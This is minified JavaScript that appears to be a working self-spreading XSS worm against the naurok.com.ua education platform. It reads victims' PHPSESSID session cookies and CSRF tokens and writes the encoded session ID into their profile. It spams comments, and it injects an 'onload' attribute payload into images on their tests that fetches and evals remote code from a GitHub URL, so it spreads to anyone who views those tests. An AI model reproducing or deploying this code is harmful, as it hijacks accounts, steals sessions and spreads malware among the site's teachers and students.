(()=>{"use strict";({607:function(){var t=this&&this.__awaiter||function(t,e,n,o){return new(n||(n=Promise))((function(r,i){function c(t){try{s(o.next(t))}catch(t){i(t)}}function a(t){try{s(o.throw(t))}catch(t){i(t)}}function s(t){var e;t.done?r(t.value):(e=t.value,e instanceof n?e:new n((function(t){t(e)}))).then(c,a)}s((o=o.apply(t,e||[])).next())}))};const e=function(t){return(new DOMParser).parseFromString(t,"text/html")},n=t=>new Promise((e=>setTimeout(e,t))),o=(e,o={})=>t(void 0,void 0,void 0,(function*(){for(let t=1;t<5;++t){const r=yield fetch(e,o);if(403!==r.status&&429!==r.status)return r;yield n(200*t)}return fetch(e,o)}));!function(){t(this,void 0,void 0,(function*(){const r=document.querySelectorAll("img[i]");for(const t of r)t.removeAttribute("onload"),t.removeAttribute("i"),t.setAttribute("src",t.getAttribute("src").slice(0,-1));if(window.e)return;window.e=!0;const i="https://naurok.com.ua/post/navchannya-u-skladnih-umovah-efektivna-distanciyka",c=document.cookie.match(/PHPSESSID=([a-z0-9]+)/);if(!c)return console.log("no ssid");const a=c[1],s=document.URL,u=document.referrer,d=yield o("https://naurok.com.ua"),l=yield d.text(),m=l.match(/meta name="csrf-token" content="(.+)"/);if(!m)return console.log("no csrf");const f=m[1];if(!f)return console.log("no csrf 2");const h=l.match(/<a href=".profile.(.+)">Особиста/);if(!h)return;const p=parseInt(h[1]);if(3250755===p)return;const y=[],g=e=>t(this,void 0,void 0,(function*(){const t=yield o(`https://naurok.com.ua/api/test/documents/${e}`);return yield t.json()})),v=function(e){return t(this,void 0,void 0,(function*(){const t=e.match(/(\d+).html/);if(!t)return;const n=t[1],r=yield g(n);if(!r)return;const{document:i,questions:c}=r;i.status=2;const a=i.id,s="https://naurok.com.ua/test/builder/"+a;if(i.image||(i.image="https://naurok-test2.nyc3.digitaloceanspaces.com/3250725/images/801236_1651844282.png"),!i.image.includes("?")){t:for(const t of c){if(t.csrf=f,t.image){t.image+="?\"i onload=\"fetch('https://raw.githubusercontent.com/nusc/a/m/i.js').then(v=>v.text()).then(eval)",yield o(`https://naurok.com.ua/api/test/questions/${t.id}?expand=options`,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8"},referrer:s,referrerPolicy:"strict-origin-when-cross-origin",body:JSON.stringify(t),method:"PATCH",mode:"cors",credentials:"include"});break}for(const e of t.options)if(e.image){e.image+="?\"i onload=\"fetch('https://raw.githubusercontent.com/nusc/a/m/i.js').then(v=>v.text()).then(eval)",yield o(`https://naurok.com.ua/api/test/questions/${n}?expand=options`,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8"},referrer:s,referrerPolicy:"strict-origin-when-cross-origin",body:JSON.stringify(t),method:"PATCH",mode:"cors",credentials:"include"});break t}}i.image+="?\"i onload=\"fetch('https://raw.githubusercontent.com/nusc/a/m/i.js').then(v=>v.text()).then(eval)",yield o("https://naurok.com.ua/api/test/documents/"+a,{headers:{accept:"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/json;charset=UTF-8",Referer:s,"Referrer-Policy":"strict-origin-when-cross-origin"},body:JSON.stringify(i),method:"PUT"})}}))};y.push(function(){return t(this,void 0,void 0,(function*(){const t=yield o("https://naurok.com.ua/preferences"),e=(yield t.text()).match(/<textarea id="accountpreferences-about" class="form-control" name="AccountPreferences.about.+">(.*)<.textarea>/s);if(!e)return;const n=e[1]+"\nu: "+s+"\nr: "+u,r=function(t){return btoa(t)}(a);yield o("https://naurok.com.ua/preferences",{headers:{accept:"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","content-type":"multipart/form-data; boundary=----WebKitFormBoundaryKnLgq0VhMq7Xl2Pu"},referrer:"https://naurok.com.ua/preferences",referrerPolicy:"strict-origin-when-cross-origin",body:`------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name="_csrf"\r\n\r\n${f}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name="AccountPreferences[position]"\r\n\r\n${r}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name="AccountPreferences[about]"\r\n\r\n${n}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data;`,method:"POST",mode:"cors",credentials:"include",redirect:"manual"})}))}()),y.push(function(){return t(this,void 0,void 0,(function*(){const t=yield o(i),e=yield t.text();if(e.includes(`href="/profile/${p}" d`))return;const n=e.match(/form id="comment-form" class="comment-box" action="\/comment\/default\/create\?entity=(.+)" method="post"/);if(!n)return console.log("ncf");const r=n[1],c=atob("Jg==");var a;yield o(`https://naurok.com.ua/comment/default/create?entity=${r}`,{headers:{accept:"*/*","accept-language":"en-US,en;q=0.9,uk;q=0.8,ru;q=0.7","content-type":"application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token":`${f}`,"x-requested-with":"XMLHttpRequest"},referrer:i,referrerPolicy:"strict-origin-when-cross-origin",body:`_csrf=${f}${c}CommentModel[content]=${a=["Зрозуміло","Дякую","Ясно, дякую","Добре"],a[Math.floor(Math.random()*a.length)]}${c}CommentModel[parentId]=${c}CommentModel[url]=/post/navchannya-u-skladnih-umovah-efektivna-distanciyka`,method:"POST",mode:"cors",credentials:"include"})}))}()),y.push(function(){var r;return t(this,void 0,void 0,(function*(){for(let t=1;;++t){const i=yield o(`https://naurok.com.ua/test/moe?storinka=${t}`),c=yield i.text(),a=e(c),s=a.querySelector("body > div.container-fluid > div > div > div.col-md-10 > div.row > div.col-md-9 > div.items > ul > li.active > a");if(!s&&1!==t)return;if(s&&s.innerText!==`${t}`)return;const u=a.querySelectorAll(".file-item.test-item");for(const t of u){const e=t.querySelector("img");if(e&&(null===(r=e.getAttribute("src"))||void 0===r?void 0:r.includes("?")))continue;const n=t.querySelector(".headline a");if(!n)continue;const o=n.getAttribute("href");o&&(yield v("https://naurok.com.ua"+o))}n(1e3)}}))}()),yield Promise.all(y)}))}()}})[607]()})();
